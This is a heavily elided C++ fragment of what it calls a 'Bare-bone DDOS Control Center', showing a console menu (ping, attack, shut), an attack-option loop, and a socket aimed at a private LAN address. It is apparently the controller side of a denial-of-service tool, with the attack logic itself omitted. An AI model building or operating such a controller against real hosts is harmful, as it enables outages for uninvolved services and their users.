...
void InitAndInput(char command[]) {      // print program info & accept command from user
	...
	cout << "Bare-bone DDOS Control Center\n";
	cout << "=============CHOOSE ONE===============\n";
	cout << "ping\nattack\nshut\n";
	cout << "======================================\n";
	...
	while (1) {
		...
		if (!strcmp(command, "attack")) {
			...
			if (!strcmp(command, "1")) break;
			if (!strcmp(command, "2")) break;
...
int main() {
	...
	addr.sin_addr.s_addr = inet_addr("192.168.0.70");
